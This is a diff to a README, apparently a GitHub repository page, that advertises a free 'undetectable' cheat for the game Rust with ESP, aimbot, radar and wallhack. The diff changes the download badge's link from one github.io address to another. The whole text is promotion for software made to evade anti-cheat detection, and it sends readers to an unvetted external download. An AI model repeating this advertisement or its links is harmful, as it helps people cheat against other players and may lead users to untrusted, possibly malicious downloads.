@@ -3,7 +3,7 @@
 🔥 Dominate **Rust** with the **Free Private Cheat**, an undetectable mod menu featuring ESP, aimbot, radar, and wallhack. Built for stealth and smooth gameplay, this cheat is optimized for private use and updated frequently to match the latest Rust patches.  
 
 
-[![Download Rust Free Private Cheat](https://img.shields.io/badge/Download-Rust%20Free%20Private%20Cheat-greenyellow)](https://bestsoftonik.github.io/public/)  
+[![Download Rust Free Private Cheat](https://img.shields.io/badge/Download-Rust%20Free%20Private%20Cheat-greenyellow)](https://rust-free-private-cheat.github.io/.github/)  
 
 ---
 
